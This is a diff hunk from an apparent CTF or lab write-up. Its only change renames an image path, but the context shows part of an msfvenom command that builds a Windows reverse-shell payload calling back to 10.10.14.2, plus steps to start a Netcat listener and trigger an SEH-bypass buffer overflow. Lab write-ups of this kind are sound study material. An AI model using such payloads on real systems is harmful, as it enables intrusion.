@@ -190,7 +190,7 @@ msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.2
 * Next, start a Netcat listener on port 443
 * Run the exploit with Python2 and detonate the SEH bypass BOF
 
-<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
